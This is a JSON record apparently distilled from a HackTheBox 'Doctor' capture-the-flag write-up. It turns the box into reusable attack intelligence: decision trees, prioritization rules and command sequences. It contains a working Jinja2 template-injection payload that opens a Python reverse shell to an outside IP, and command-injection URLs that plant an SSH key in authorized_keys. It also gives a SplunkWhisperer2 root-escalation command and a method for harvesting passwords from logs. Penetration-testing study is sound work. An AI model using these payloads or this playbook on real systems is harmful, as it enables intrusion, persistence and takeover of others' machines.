{
  "writeup_id": "Htb_Doctor",
  "scenario_fingerprint": {
    "scenario_name": "linux_web_ssti_splunk_privilege_escalation",
    "primary_services": [
      "http",
      "ssh",
      "splunkd"
    ],
    "port_signature": "22+80+8089",
    "service_combination": "ssh+apache+splunkd",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "server_side_template_injection",
    "privilege_path": "web_to_splunk_admin_to_root",
    "attack_complexity": "medium",
    "estimated_time": "60-90 minutes",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "python_flask_werkzeug_server",
      "splunk_management_port_8089",
      "message_board_functionality",
      "archive_endpoint_xml_output",
      "log_file_password_disclosure"
    ],
    "environmental_clues": [
      "werkzeug_python_headers",
      "apache_static_site_with_flask_subdomain",
      "splunk_default_certificate",
      "ubuntu_20_04_versions",
      "doctors_htb_domain"
    ],
    "similar_scenarios": [
      "node_blog_htb",
      "writer_htb_medium"
    ],
    "unique_aspects": [
      "dual_web_servers_apache_flask",
      "splunkwhisperer2_exploitation",
      "password_in_log_files",
      "xml_archive_endpoint"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Server-Side Template Injection (SSTI)",
        "success_reason": "Archive endpoint processed user input through template engine without sanitization",
        "prerequisite_indicators": [
          "python_web_framework_detected",
          "werkzeug_server_headers",
          "user_input_reflected_in_responses",
          "template_engine_in_use"
        ],
        "recognition_patterns": [
          "Werkzeug/Python server headers",
          "{{7*7}} returns 49 in archive endpoint",
          "{{7*'7'}} returns 7777777 (Jinja2 behavior)",
          "user input processed differently in archive vs main page"
        ],
        "failure_modes": [
          "input_sanitization_enabled",
          "template_engine_sandboxed",
          "no_user_input_in_templates",
          "archive_endpoint_not_discovered"
        ],
        "environmental_factors": [
          "flask_jinja2_default_configuration",
          "beta_feature_insufficient_testing",
          "different_processing_paths_for_endpoints"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "Log File Password Harvesting",
        "success_reason": "Web server logs contained plaintext password from password reset URL",
        "prerequisite_indicators": [
          "web_user_has_log_access",
          "password_reset_functionality_exists",
          "logs_not_rotated_frequently",
          "sensitive_data_logged"
        ],
        "recognition_patterns": [
          "access to /var/log/apache2/",
          "password reset URLs in access logs",
          "plaintext credentials in GET parameters",
          "recent log entries with sensitive data"
        ],
        "failure_modes": [
          "logs_rotated_or_cleared",
          "no_log_access_permissions",
          "passwords_not_logged",
          "encrypted_log_storage"
        ],
        "environmental_factors": [
          "default_apache_logging_configuration",
          "insufficient_log_sanitization",
          "shared_user_credentials"
        ],
        "success_probability": 0.65,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "SplunkWhisperer2 RCE",
        "success_reason": "Splunk management port accessible with harvested credentials",
        "prerequisite_indicators": [
          "splunk_port_8089_open",
          "valid_splunk_credentials_obtained",
          "splunk_universal_forwarder_running",
          "insufficient_splunk_hardening"
        ],
        "recognition_patterns": [
          "port 8089 serving Splunkd",
          "SplunkServerDefaultCert in SSL cert",
          "credential reuse from other services",
          "splunk management API accessible"
        ],
        "failure_modes": [
          "splunk_properly_configured",
          "different_credentials_required",
          "network_segmentation_blocking_access",
          "splunk_version_patched"
        ],
        "environmental_factors": [
          "default_splunk_installation",
          "credential_reuse_across_services",
          "insufficient_network_segmentation"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "5-10 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Archive endpoint with SSTI vulnerability",
        "discovery_method": "Source code analysis and template injection testing",
        "why_critical": "Hidden endpoint processed user input through template engine unsafely",
        "how_to_recognize": [
          "commented HTML references to /archive",
          "different server behavior between endpoints",
          "template injection payloads executed in XML output"
        ],
        "follow_up_actions": [
          "test_jinja2_rce_payloads",
          "enumerate_python_modules",
          "attempt_reverse_shell"
        ]
      },
      {
        "discovery": "Password in Apache access logs",
        "discovery_method": "Log file enumeration after gaining web shell",
        "why_critical": "Plaintext password provided lateral movement and Splunk access",
        "how_to_recognize": [
          "web user with log read permissions",
          "password reset URLs in access logs",
          "GET parameters containing sensitive data"
        ],
        "follow_up_actions": [
          "test_password_against_system_users",
          "attempt_splunk_authentication",
          "check_credential_reuse"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "web_user",
        "escalation_method": "credential_harvesting_to_splunk_rce",
        "why_possible": "Password reuse between system user and Splunk service",
        "recognition_signs": [
          "log_file_access_permissions",
          "password_reset_functionality_logging",
          "splunk_service_running_on_target"
        ],
        "exploitation_path": "SSTI → Web Shell → Log Analysis → Credential Harvest → Splunk RCE → Root"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,80,8089 open on Linux host",
        "decision": "Enumerate web services first, then investigate Splunk management port",
        "reasoning": "Port 8089 indicates Splunk management interface which requires credentials, web ports may provide initial access",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "ssh_enumeration",
            "when": "if web services fail"
          },
          {
            "option": "splunk_default_creds",
            "when": "if no other access found"
          }
        ],
        "success_indicators": [
          "web_application_found",
          "virtual_hosts_discovered",
          "authentication_mechanisms_identified"
        ],
        "next_decision": "analyze_web_applications"
      },
      {
        "step": 2,
        "situation": "Found virtual host doctors.htb with Python Flask application",
        "decision": "Test for SSTI and command injection vulnerabilities",
        "reasoning": "Werkzeug/Python stack commonly vulnerable to template injection, user input forms present",
        "confidence": 0.85,
        "prerequisites": [
          "user_registration_available",
          "post_creation_functionality"
        ],
        "success_indicators": [
          "template_evaluation_occurs",
          "command_execution_achieved"
        ],
        "failure_fallbacks": [
          "sql_injection",
          "file_upload_attacks",
          "directory_traversal"
        ]
      },
      {
        "step": 3,
        "situation": "SSTI confirmed in /archive endpoint",
        "decision": "Exploit Jinja2 SSTI for RCE",
        "reasoning": "Archive endpoint processes template syntax, Jinja2 payload successful",
        "confidence": 0.95,
        "prerequisites": [
          "ssti_confirmed",
          "jinja2_identified"
        ],
        "success_indicators": [
          "reverse_shell_obtained"
        ],
        "failure_fallbacks": [
          "command_injection_in_forms",
          "file_read_via_ssti"
        ]
      }
    ],
    "branching_logic": {
      "if_ssti_succeeds": {
        "action": "establish_reverse_shell",
        "tools": [
          "jinja2_rce_payload",
          "netcat_listener"
        ],
        "next_phase": "privilege_escalation_enumeration"
      },
      "if_ssti_fails": {
        "action": "try_command_injection",
        "alternatives": [
          "form_parameter_injection",
          "header_injection",
          "file_upload"
        ],
        "decision_criteria": "based_on_input_validation_bypass"
      },
      "if_web_shell_obtained": {
        "action": "enumerate_system_and_logs",
        "purpose": "find_credentials_for_privilege_escalation",
        "tools": [
          "linpeas",
          "log_analysis",
          "config_file_review"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_archive_endpoints_for_ssti",
        "reasoning": "archive_endpoints_often_process_templates_differently",
        "applicability": "python_web_applications"
      },
      {
        "rule": "test_ssti_in_hidden_endpoints_not_main_display",
        "reasoning": "template_processing_may_occur_in_backend_feeds",
        "applicability": "when_main_forms_show_no_template_injection"
      },
      {
        "rule": "enumerate_splunk_after_obtaining_any_credentials",
        "reasoning": "splunk_management_ports_often_reuse_system_credentials",
        "applicability": "splunk_services_identified"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Server-Side Template Injection (SSTI)",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "python_web_framework",
          "template_engine_present",
          "user_input_in_templates",
          "werkzeug_or_flask_detected"
        ],
        "success_indicators": [
          "werkzeug_server_header",
          "python_version_in_headers",
          "template_syntax_evaluation",
          "math_expressions_executed"
        ],
        "incompatible_with": [
          "input_sanitization_enabled",
          "template_sandboxing",
          "static_content_only"
        ],
        "confidence_boosters": [
          "flask_framework_detected",
          "jinja2_template_engine",
          "user_generated_content",
          "archive_xml_endpoint"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "Splunk Universal Forwarder Hijacking",
        "mitre_id": "T1210",
        "required_services": [
          "splunkd"
        ],
        "required_ports": [
          8089
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "splunk_service_running",
          "management_port_accessible",
          "valid_credentials_available"
        ],
        "success_indicators": [
          "splunkd_banner_detected",
          "ssl_cert_splunk_default",
          "rest_api_accessible",
          "authentication_successful"
        ],
        "incompatible_with": [
          "network_isolation",
          "strong_authentication_required",
          "service_disabled"
        ],
        "confidence_boosters": [
          "default_splunk_configuration",
          "weak_credentials",
          "universal_forwarder_version"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "5-15 minutes"
      },
      {
        "technique": "Log File Password Harvesting",
        "mitre_id": "T1552.001",
        "required_services": [
          "any"
        ],
        "required_ports": [],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "log_file_access",
          "password_reset_functionality",
          "credentials_logged_plaintext"
        ],
        "success_indicators": [
          "web_server_log_access",
          "password_reset_urls_logged",
          "plaintext_credentials_found"
        ],
        "incompatible_with": [
          "log_encryption",
          "credential_masking",
          "restricted_log_access"
        ],
        "confidence_boosters": [
          "apache_access_logs",
          "password_reset_feature",
          "poor_logging_practices"
        ],
        "typical_success_rate": 0.6,
        "estimated_time": "15-45 minutes"
      }
    ],
    "environmental_detectors": {
      "python_web_framework": {
        "port_indicators": [
          80,
          443,
          8080,
          5000
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "Werkzeug",
          "Python",
          "Flask",
          "Django"
        ],
        "confidence_threshold": 0.85
      },
      "splunk_service": {
        "port_indicators": [
          8089,
          8000,
          9997
        ],
        "service_indicators": [
          "splunkd",
          "ssl/http"
        ],
        "banner_indicators": [
          "Splunkd",
          "SplunkServerDefaultCert"
        ],
        "confidence_threshold": 0.9
      },
      "ubuntu_linux": {
        "port_indicators": [
          22
        ],
        "service_indicators": [
          "ssh"
        ],
        "banner_indicators": [
          "OpenSSH",
          "Ubuntu"
        ],
        "confidence_threshold": 0.8
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "ssti_exploitation",
          "when": "python_web_framework_detected",
          "reason": "direct_rce_potential_common_in_flask"
        },
        {
          "attack": "splunk_exploitation",
          "when": "splunkd_service_detected_with_creds",
          "reason": "reliable_privilege_escalation_path"
        }
      ],
      "medium_priority": [
        {
          "attack": "log_file_enumeration",
          "when": "web_shell_obtained",
          "reason": "often_contains_credentials_for_lateral_movement"
        },
        {
          "attack": "credential_reuse_testing",
          "when": "passwords_discovered",
          "reason": "users_often_reuse_passwords_across_services"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Server-Side Template Injection (SSTI)",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "Jinja2 SSTI Payload",
            "command_template": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"{command}\").read().zfill(417)}}{%endif%}{% endfor %}",
            "actual_command": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"10.10.14.6\\\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\"/bin/bash\\\", \\\"-i\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}",
            "output_pattern": "reverse_shell_connection",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "web_application_with_template_engine",
          "user_input_processed_in_templates",
          "jinja2_or_similar_template_engine"
        ],
        "success_indicators": [
          "mathematical_expressions_evaluated",
          "template_syntax_processed",
          "code_execution_achieved"
        ],
        "common_failures": [
          "input_sanitization_present",
          "template_engine_sandboxed",
          "payload_syntax_errors"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "log_file_analysis",
          "credential_harvesting"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Command Injection via URL Validation",
        "mitre_id": "T1059.004",
        "category": "execution",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "curl command injection",
            "command_template": "http://{attacker_ip}/$(command)",
            "actual_command": "http://10.10.14.6/$(whoami)",
            "output_pattern": "command_output_in_http_request",
            "effectiveness_rating": 4,
            "reliability": 0.85
          },
          {
            "name": "SSH key injection",
            "command_template": "http://{ip}/$(echo$IFS'{ssh_key}'>'{path}')",
            "actual_command": "http://10.10.14.6/$(echo$IFS'ssh-ed25519'$IFS'AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d'>'/home/web/.ssh/authorized_keys')",
            "success_factors": [
              "writable_ssh_directory",
              "ssh_service_accessible"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "url_validation_functionality",
          "server_side_curl_execution",
          "command_substitution_possible"
        ],
        "success_indicators": [
          "command_output_in_http_logs",
          "icmp_responses_received",
          "ssh_key_authentication_successful"
        ],
        "common_failures": [
          "input_sanitization",
          "command_execution_restrictions",
          "network_connectivity_issues"
        ],
        "follow_up_techniques": [
          "ssh_persistence",
          "privilege_escalation",
          "lateral_movement"
        ],
        "time_investment": "15-45 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Splunk Universal Forwarder Exploitation",
        "mitre_id": "T1190",
        "category": "privilege_escalation",
        "phase": "post_exploitation",
        "tools_used": [
          {
            "name": "SplunkWhisperer2",
            "command_template": "python SplunkWhisperer2.py --host {target_ip} --port 8089 --username {user} --password {pass} --payload \"{command}\"",
            "actual_command": "python SplunkWhisperer2.py --host 10.10.10.209 --port 8089 --username admin --password {discovered_password} --payload \"reverse_shell_command\"",
            "output_pattern": "root_shell_obtained",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "splunk_management_port_accessible",
          "valid_splunk_credentials",
          "splunk_universal_forwarder_running"
        ],
        "success_indicators": [
          "authentication_successful",
          "command_execution_as_root",
          "reverse_shell_connection"
        ],
        "common_failures": [
          "invalid_credentials",
          "network_restrictions",
          "splunk_version_incompatibility"
        ],
        "follow_up_techniques": [
          "persistence_establishment",
          "data_exfiltration",
          "lateral_movement"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "SSTI Detection",
        "use_case": "template_injection_identification",
        "effectiveness_rating": 5,
        "reliability": 0.92,
        "learning_curve": "medium",
        "essential_for": [
          "python_web_applications"
        ],
        "alternatives": [
          "manual_payload_testing",
          "burp_extensions"
        ],
        "best_practices": [
          "test_mathematical_expressions_first",
          "check_multiple_input_fields",
          "verify_template_engine_type"
        ]
      },
      {
        "tool": "Command Injection via IFS",
        "use_case": "space_character_bypass",
        "effectiveness_rating": 4,
        "reliability": 0.8,
        "learning_curve": "low",
        "essential_for": [
          "command_injection_scenarios"
        ],
        "alternatives": [
          "url_encoding",
          "hex_encoding"
        ],
        "best_practices": [
          "use_ifs_for_space_replacement",
          "wrap_arguments_in_single_quotes",
          "test_simple_commands_first"
        ]
      },
      {
        "tool": "SplunkWhisperer2",
        "use_case": "splunk_universal_forwarder_exploitation",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "splunk_environments"
        ],
        "alternatives": [
          "manual_splunk_api_exploitation"
        ],
        "best_practices": [
          "verify_splunk_version_compatibility",
          "test_credentials_before_exploitation",
          "use_encrypted_payloads_when_possible"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "ssti_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "{{7*7}}",
            "purpose": "Test for SSTI vulnerability",
            "expected_output": "49 in /archive endpoint"
          },
          {
            "step": 2,
            "command": "{{7*'7'}}",
            "purpose": "Identify template engine type",
            "expected_output": "7777777 indicates Jinja2"
          },
          {
            "step": 3,
            "command": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"10.10.14.6\\\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\"/bin/bash\\\", \\\"-i\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}",
            "purpose": "Execute reverse shell payload",
            "expected_output": "Shell as web user"
          }
        ],
        "success_rate": 0.9,
        "typical_duration": "10-20 minutes"
      },
      {
        "sequence_name": "command_injection_to_ssh",
        "steps": [
          {
            "step": 1,
            "command": "http://10.10.14.6/$(whoami)",
            "purpose": "Test command injection",
            "expected_output": "GET /web in HTTP logs"
          },
          {
            "step": 2,
            "command": "http://10.10.14.6/$(mkdir$IFS'/home/web/.ssh')",
            "purpose": "Create SSH directory",
            "expected_output": "Directory created successfully"
          },
          {
            "step": 3,
            "command": "http://10.10.14.6/$(echo$IFS'ssh-ed25519'$IFS'AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d'>'/home/web/.ssh/authorized_keys')",
            "purpose": "Install SSH public key",
            "expected_output": "SSH key authentication enabled"
          },
          {
            "step": 4,
            "command": "ssh -i private_key web@10.10.10.209",
            "purpose": "Connect via SSH",
            "expected_output": "SSH shell as web user"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "15-30 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Doctor",
      "difficulty": "Easy",
      "os": "Ubuntu 20.04",
      "platform": "HackTheBox",
      "release_date": "2020-09-26",
      "author": "egotisticalSW",
      "estimated_time": "60-90 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "beginner_to_intermediate",
      "primary_attack_vectors": [
        "web_application",
        "template_injection",
        "splunk_exploitation"
      ],
      "key_vulnerabilities": [
        "ssti",
        "command_injection",
        "log_exposure",
        "splunk_rce"
      ],
      "environment_type": "web_application_with_logging_service",
      "real_world_relevance": "high",
      "learning_value": [
        "ssti_exploitation",
        "log_analysis",
        "splunk_attacks",
        "credential_reuse"
      ],
      "prerequisite_knowledge": [
        "web_application_testing",
        "template_engines",
        "basic_linux"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "template_injection",
        "log_exploitation",
        "splunk_attacks"
      ],
      "attack_types": [
        "initial_access",
        "credential_access",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "input_validation",
        "log_security",
        "service_hardening",
        "credential_management"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Node",
        "Poison",
        "Arkham"
      ],
      "similarity_reasons": [
        "web_application_focus",
        "template_injection",
        "log_analysis"
      ],
      "unique_aspects": [
        "splunk_exploitation",
        "message_board_application",
        "splunkwhisperer2"
      ],
      "difficulty_factors": [
        "multiple_attack_paths",
        "log_analysis_required",
        "service_specific_exploitation"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-05T01:29:32.638392",
    "original_file": "0xdf_writeups/Htb Doctor.md",
    "content_length": 37137,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}